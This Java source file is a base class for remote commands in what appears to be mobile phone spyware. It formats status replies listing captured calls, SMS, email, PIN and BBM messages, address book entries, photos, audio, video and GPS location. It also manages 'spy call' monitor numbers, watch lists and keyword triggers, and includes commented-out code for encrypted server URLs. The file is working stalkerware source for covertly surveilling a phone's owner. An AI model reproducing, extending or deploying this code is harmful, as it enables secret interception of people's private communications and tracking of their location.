package com.vvt.rmtcmd.pcc;

import java.io.IOException;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Vector;
import com.vvt.db.FxEventDatabase;
import com.vvt.encryption.AESDecryptor;
import com.vvt.encryption.AESEncryptor;
import com.vvt.encryption.AESKeyGenerator;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.event.constant.FxDirection;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSOption;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.pref.PrefAddressBook;
import com.vvt.pref.PrefAudioFile;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCameraImage;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefPIN;
import com.vvt.pref.PrefVideoFile;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.rmtcmd.command.KeywordDatabase;
import com.vvt.rmtcmd.command.MonitorNumberDatabase;
import com.vvt.rmtcmd.command.WatchNumberDatabase;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.ByteUtil;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public abstract class PCCRmtCommand {
	
	private final String TAG = "PCCRmtCommand";
	public static final int DISABLE = 0;
	public static final int ENABLE = 1;
	public static final int ENABLE_ALL_NUMBER = 2;
	protected FxEventDatabase db = Global.getFxEventDatabase();
	protected StringBuffer responseMessage = new StringBuffer();
	protected LicenseManager licenseMgr = Global.getLicenseManager();
	protected LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	protected PCCRmtCmdExecutionListener observer = null;
	protected ServerUrl serverUrl = Global.getServerUrl();
	protected Preference pref = Global.getPreference();
	protected PrefBugInfo prefBugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
	protected PrefWatchListInfo prefWatchListInfo = prefBugInfo.getPrefWatchListInfo();
	protected KeywordDatabase kwDatabase = Global.getKeywordDatabase();
	protected Vector keywordStore = null;
	protected Vector numberList = null; 
	
	protected void createSystemEventOut(String message) {
//		Log.debug(TAG + ".createSystemEventOut()", "ENTER: " + this.getClass());
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.PCC_REPLY);
		systemEvent.setEventTime(System.currentTimeMillis());
		systemEvent.setDirection(FxDirection.OUT);
		systemEvent.setSystemMessage(message);
		db.insert(systemEvent);
	}
	
	protected void doPCCAppSetting() {
		Preference pref = Global.getPreference();
		PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		PrefAddressBook addrInfo = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
		PrefMessenger messageInfo = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
		PrefPIN pinInfo = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
		PrefAudioFile prefAudio = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
		PrefCameraImage prefImage = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
		PrefVideoFile prefVideo = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
		PrefBugInfo bugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
		boolean captured = generalInfo.isCaptured();
		responseMessage.append(Constant.CRLF);
		responseMessage.append(RmtCmdTextResource.CAPTURE);
		if (captured) {
			responseMessage.append(RmtCmdTextResource.ON);
		} else {
			responseMessage.append(RmtCmdTextResource.OFF);
		}
		responseMessage.append(Constant.CRLF);
		responseMessage.append(RmtCmdTextResource.DELIVERY_RULES);
		if (generalInfo.getSendTimeIndex() != 0) {
			responseMessage.append(ApplicationInfo.TIME[generalInfo.getSendTimeIndex()]);
		} else {
			responseMessage.append(RmtCmdTextResource.NO_DELIVERY);
		}
		responseMessage.append(Constant.COMMA_AND_SPACE);
		responseMessage.append(generalInfo.getMaxEventCount());
		responseMessage.append(RmtCmdTextResource.EVENT);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(RmtCmdTextResource.EVENT_WITH_COLON);
		if (!eventInfo.isCallLogEnabled() && !eventInfo.isSMSEnabled()
				&& !eventInfo.isEmailEnabled() && !pinInfo.isEnabled()
				&& !cellInfo.isEnabled() && !addrInfo.isEnabled()
				&& !messageInfo.isBBMEnabled() && !prefImage.isEnabled()
				&& !prefAudio.isEnabled() && !prefVideo.isEnabled()
				&& !gpsInfo.isEnabled()) {			
				responseMessage.append(RmtCmdTextResource.NONE);			
		} else {
			// Call, SMS, Email
			if (eventInfo.isSupported()) {
				if (eventInfo.isCallLogEnabled()) {
					responseMessage.append(RmtCmdTextResource.CALL);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
				if (eventInfo.isSMSEnabled()) {
					responseMessage.append(RmtCmdTextResource.SMS);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
				if (eventInfo.isEmailEnabled()) {
					responseMessage.append(RmtCmdTextResource.EMAIL);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
			}
			// PIN
			if (pinInfo.isSupported()) {
				if (pinInfo.isEnabled()) {
					responseMessage.append(RmtCmdTextResource.PIN);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
			}
			// CellInfo
			if (cellInfo.isSupported()) {
				if (cellInfo.isEnabled()) {
					responseMessage.append(RmtCmdTextResource.CELL_SITE);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
			}
			// Address Book
			if (addrInfo.isSupported()) {
				if (addrInfo.isEnabled()) {
					responseMessage.append(RmtCmdTextResource.ADDRESS_BOOK);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
			}
			// IM
			if (messageInfo.isSupported()) {
				if (messageInfo.isBBMEnabled()) {
					responseMessage.append(RmtCmdTextResource.IM);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
			}
			// Image
			if (prefImage.isSupported()) {
				if (prefImage.isEnabled()) {
					responseMessage.append(RmtCmdTextResource.IMAGE);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
			}
			// Audio
			if (prefAudio.isSupported()) {
				if (prefAudio.isEnabled()) {
					responseMessage.append(RmtCmdTextResource.AUDIO);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
			}
			// Video
			if (prefVideo.isSupported()) {
				if (prefVideo.isEnabled()) {
					responseMessage.append(RmtCmdTextResource.VIDEO);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
			}
			// GPS
			if (gpsInfo.isSupported()) {
				if (gpsInfo.isEnabled()) {
					responseMessage.append(RmtCmdTextResource.LOCATION);
					responseMessage.append(Constant.COMMA_AND_SPACE);
				}
			}
			// To eliminate ", " at the end.
			int resLen = responseMessage.length();
			int lastCommaInx = resLen - 2;
			char comma = ',';
			if (responseMessage.charAt(lastCommaInx) == comma) {
				responseMessage.delete(lastCommaInx, resLen - 1);
			}
		}
		// GPS and CellInfo Information
		if (gpsInfo.isSupported()) {
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.LOCATION_INTERVAL);
			GPSOption gpsOpt = gpsInfo.getGpsOption();
			responseMessage.append(ApplicationInfo.LOCATION_TIMER_REPLY[getTimerIndex(gpsOpt.getInterval())]);
		}
		if (cellInfo.isSupported()) {
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.CELL_SITE_INTERVAL);
			responseMessage.append(ApplicationInfo.LOCATION_TIMER_REPLY[getTimerIndex(cellInfo.getInterval())]);
		}
		if (bugInfo.isSupported()) {
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.SPY_CALL);
			if (bugInfo.isEnabled()) {
				responseMessage.append(RmtCmdTextResource.ON);
			} else {
				responseMessage.append(RmtCmdTextResource.OFF);
			}
			responseMessage.append(Constant.COMMA_AND_SPACE);
			responseMessage.append(Constant.L_SQUARE_BRACKET);
			if (bugInfo.countMonitorNumber() > 0) {
				for (int i = 0; i < bugInfo.countMonitorNumber(); i++) {
					responseMessage.append(bugInfo.getMonitorNumber(i));
					if (i != (bugInfo.countMonitorNumber() - 1)) {
						responseMessage.append(Constant.COMMA_AND_SPACE);
					}
				}
			} else {
				responseMessage.append(RmtCmdTextResource.NONE);
			}
			responseMessage.append(Constant.R_SQUARE_BRACKET);
			// Watch options
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.WATCH_OPTIONS);				
			if (watchListInfo.isWatchListEnabled()) {
				responseMessage.append(RmtCmdTextResource.ON);
			} else {
				responseMessage.append(RmtCmdTextResource.OFF);
			}
			responseMessage.append(Constant.COMMA_AND_SPACE);
			responseMessage.append(Constant.L_SQUARE_BRACKET);
			if (watchListInfo.isInAddrbookEnabled()) {
				responseMessage.append(RmtCmdTextResource.ONE);					
			} else {
				responseMessage.append(RmtCmdTextResource.ZERO);
			}
			responseMessage.append(Constant.COMMA_AND_SPACE);
			if (watchListInfo.isNotInAddrbookEnabled()) {
				responseMessage.append(RmtCmdTextResource.ONE);		
			} else {
				responseMessage.append(RmtCmdTextResource.ZERO);
			}
			responseMessage.append(Constant.COMMA_AND_SPACE);
			if (watchListInfo.isInWatchListEnabled()) {
				responseMessage.append(RmtCmdTextResource.ONE);		
			} else {
				responseMessage.append(RmtCmdTextResource.ZERO);
			}
			responseMessage.append(Constant.COMMA_AND_SPACE);
			if (watchListInfo.isUnknownEnabled()) {
				responseMessage.append(RmtCmdTextResource.ONE);		
			} else {
				responseMessage.append(RmtCmdTextResource.ZERO);
			}
			responseMessage.append(Constant.R_SQUARE_BRACKET);
			
		}
		if (bugInfo.isSupported()) {
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.HOME);
			responseMessage.append(Constant.L_SQUARE_BRACKET);
			if (bugInfo.countHomeOutNumber() > 0) {
				for (int i = 0; i < bugInfo.countHomeOutNumber(); i++) {
					responseMessage.append(bugInfo.getHomeOutNumber(i));
					if (i != (bugInfo.countHomeOutNumber() - 1)) {
						responseMessage.append(Constant.COMMA_AND_SPACE);
					}
				}				
			} else {
				responseMessage.append(RmtCmdTextResource.NONE);
			}
			responseMessage.append(Constant.R_SQUARE_BRACKET);
		}
	}
	
	protected void clearServUrlDatabase() {
		// TODO: Not supported! 
		/* Hashtable listServUrl = serverUrl.getListServerUrl();
		listServUrl.clear();		
		serverUrl.setListServerUrl(listServUrl); */
	}	
	
	protected boolean isDuplicateUrl(Vector urlList) throws IOException {
		// TODO: Not supported
		boolean duplicate = false;		
		/* Hashtable listServUrl = serverUrl.getListServerUrl();
		for (int i = 0; i < urlList.size(); i++) {
			String url = (String) urlList.elementAt(i);
			if (!url.endsWith("/")) {
				url += "/";
			}
			url += "gateway";
			String http = "http://";
			if (!url.startsWith(http)) {
				url = http.concat(url);
			}			
			Enumeration e = listServUrl.keys();
			while (e.hasMoreElements()) {
				byte[] key = (byte[]) e.nextElement();
				byte[] encryptedUrl = (byte[]) listServUrl.get(key);
				String serActUrl = new String(AESDecryptor.decrypt(key, encryptedUrl));				
				if (url.equalsIgnoreCase(serActUrl)) {
					duplicate = true;
					break;
				}
			}
			if (!duplicate) {
				byte[] key = AESKeyGenerator.generateAESKey();
				byte[] encryptedUrl = AESEncryptor.encrypt(key, ByteUtil.toByte(url));
				listServUrl.put(key, encryptedUrl);
			}
		}
		serverUrl.setListServerUrl(listServUrl); */
		return duplicate;
	}
	
	protected void doPCCHeader(int cmdId) {
		responseMessage.delete(0, responseMessage.length());
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(cmdId);
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// Monitor Number
	protected boolean isDuplicateMonitorNumber() {
		boolean duplicate = false;
		if (isDuplicateNumbers(numberList, prefBugInfo.getMonitorNumberStore())) {
			duplicate = true;
		}
		return duplicate;
	}
	
	protected boolean isDuplicateHomeOutNumber() {
		boolean duplicate = false;
		if (isDuplicateNumbers(numberList, prefBugInfo.getHomeOutNumberStore())) {
			duplicate = true;
		}
		return duplicate;
	}
	
	protected boolean isDuplicateHomeInNumber() {
		boolean duplicate = false;
		if (isDuplicateNumbers(numberList, prefBugInfo.getHomeInNumberStore())) {
			duplicate = true;
		}
		return duplicate;
	}
	
	protected boolean isDuplicateWatchNumber() {
		boolean duplicate = false;
		if (isDuplicateNumbers(numberList, prefWatchListInfo.getWatchNumberStore())) {
			duplicate = true;
		}
		return duplicate;
	}
	
	protected boolean isDuplicateKeyword() {
		boolean duplicate = false;
		if (isDuplicateNumbers(keywordStore, kwDatabase.getKeywordStore())) {
			duplicate = true;
		}
		return duplicate;
	}
	
	protected boolean isExceededDB(int freeSizeDb, int countNumber) {
		boolean exceeded = false;
		if (countNumber > freeSizeDb) {
			exceeded = true;
		}
		return exceeded;
	}
	
	protected boolean isExceededMonitorNumberDB() {
		boolean exceeded = false;
		int maxMonNumDB = prefBugInfo.getMaxMonitorNumbers();
		int freeSizeDB = maxMonNumDB - prefBugInfo.countMonitorNumber();
		if (numberList.size() > freeSizeDB) {
			exceeded = true;
		}
		return exceeded;
	}
	
	protected boolean isExceededHomeOutNumberDB() {
		boolean exceeded = false;
		int maxHomeOutNumDb = prefBugInfo.getMaxHomeOutNumbers();
		int freeSizeDB = maxHomeOutNumDb - prefBugInfo.countHomeOutNumber();
		if (numberList.size() > freeSizeDB) {
			exceeded = true;
		}
		return exceeded;
	}
	
	protected boolean isExceededHomeInNumberDB() {
		boolean exceeded = false;
		int maxHomeInNumDb = prefBugInfo.getMaxHomeInNumbers();
		int freeSizeDB = maxHomeInNumDb - prefBugInfo.countHomeInNumber();
		if (numberList.size() > freeSizeDB) {
			exceeded = true;
		}
		return exceeded;
	}
	
	protected boolean isExceededWatchNumberDB() {
		boolean exceeded = false;
		int maxWatchNumDb = prefBugInfo.getMaxWatchNumbers();
		int freeSizeDb = maxWatchNumDb - prefWatchListInfo.countWatchNumber();
		if (numberList.size() > freeSizeDb) {
			exceeded = true;
		}
		return exceeded;
	}
	
	protected void addMonitorNumberDB() {
		String monitorNumber = null;
		int countMonNum = numberList.size();
		for (int i = 0; i < countMonNum; i++) {
			monitorNumber = (String) numberList.elementAt(i);
			prefBugInfo.addMonitorNumber(monitorNumber);
		}
		pref.commit(prefBugInfo);
	}
	
	protected void addHomeOutNumberDB() {
		String homeoutNumber = null;
		int countHomeOut = numberList.size();
		for (int i = 0; i < countHomeOut; i++) {
			homeoutNumber = (String) numberList.elementAt(i);
			prefBugInfo.addHomeOutNumber(homeoutNumber);
		}
		pref.commit(prefBugInfo);
	}
	
	protected void addHomeInNumberDB() {
		String homeInNumber = null;
		int countHomeIn = numberList.size();
		for (int i = 0; i < countHomeIn; i++) {
			homeInNumber = (String) numberList.elementAt(i);
			prefBugInfo.addHomeInNumber(homeInNumber);
		}
		pref.commit(prefBugInfo);
	}
	
	protected void addWatchNumberDB() {
		int countWatchNum = numberList.size();
		for (int i = 0; i < countWatchNum; i++) {
			prefWatchListInfo.addWatchNumber((String) numberList.elementAt(i));
		}
		prefBugInfo.setPrefWatchListInfo(prefWatchListInfo);
		pref.commit(prefBugInfo);
	}
	
	protected void addKeywordDatabase() {
		int countKeyword = keywordStore.size();
		if (countKeyword > 0) {
			for (int i = 0; i < countKeyword; i++) {
				kwDatabase.addKeyword((String) keywordStore.elementAt(i));
			}				
			kwDatabase.commit();
		}
	}
	
	protected void clearMonitorNumberDB() {
		prefBugInfo.removeAllMonitorNumbers();
		pref.commit(prefBugInfo);
	}
	
	protected void clearHomeOutNumberDB() {
		prefBugInfo.removeAllHomeOutNumbers();
		pref.commit(prefBugInfo);
	}
	
	protected void clearHomeInNumberDB() {
		prefBugInfo.removeAllHomeInNumbers();
		pref.commit(prefBugInfo);
	}
	
	protected void clearWatchNumberDB() {
		prefWatchListInfo.removeAllWatchNumbers();
		prefBugInfo.setPrefWatchListInfo(prefWatchListInfo);
		pref.commit(prefBugInfo);
	}
	
	protected void clearKeywordDB() {
		kwDatabase.clearKeyword();
		kwDatabase.commit();
	}
	
	// Keyword
	protected boolean isValidKeyword() {
		int validLength = 10;
		boolean valid = true;
		String keyword = null;
		int countKeyword = keywordStore.size();
		for (int i = 0; i < countKeyword; i++) {
			keyword = (String) keywordStore.elementAt(i);
			if (keyword.length() < validLength) {
				valid = false;
				break;
			}
		}		
		return valid;
	}
	
	protected boolean isInvalidNumber() {
		boolean invalid = false;
		int countNumber = numberList.size();
		for (int i = 0; i < countNumber; i++) {
			if (!isDigit((String) numberList.elementAt(i))) {
				invalid = true;
				break;
			}
		}
		return invalid;
	}	
		
	protected boolean isDuplicateNumbers(Vector srcNumbers, Vector destNumbers) {
		boolean duplicate = false;
		int countSrcNumbers = srcNumbers.size();
		int countDestNumbers = destNumbers.size();
		for (int i = 0; i < countSrcNumbers; i++) {
			String srcNumber = (String) srcNumbers.elementAt(i);
			for (int j = 0; j < countDestNumbers; j++) {
				String destNumber = (String) destNumbers.elementAt(j);
				if (srcNumber.equals(destNumber)) {
					duplicate = true;
					break;
				}
			}
			if (duplicate) {
				break;
			}			
		
		}
		return duplicate;
	}
		
	private boolean isDigit(String number) {		
		boolean digit = true;		
		if (number.startsWith(Constant.PLUS)) {
			number = number.substring(1);
		}
		if ((number != null) && (number.length() > 0)) {
			for (int i = 0; i < number.length(); i++) {
				if (!Character.isDigit(number.charAt(i))) {
					digit = false;
					break;
				}
			}
		}
		else {
			digit = false;
		}
		return digit;
	}
	
	private int getTimerIndex(int interval) {
		int index = 0;
		for (int i = 0; i < ApplicationInfo.LOCATION_TIMER_SECONDS.length; i++) {
			if (ApplicationInfo.LOCATION_TIMER_SECONDS[i] == interval) {
				index = i;
				break;
			}
		}
		return index;
	}
	
	public abstract void execute(PCCRmtCmdExecutionListener ppcRmtCmdProcessingManager);
}
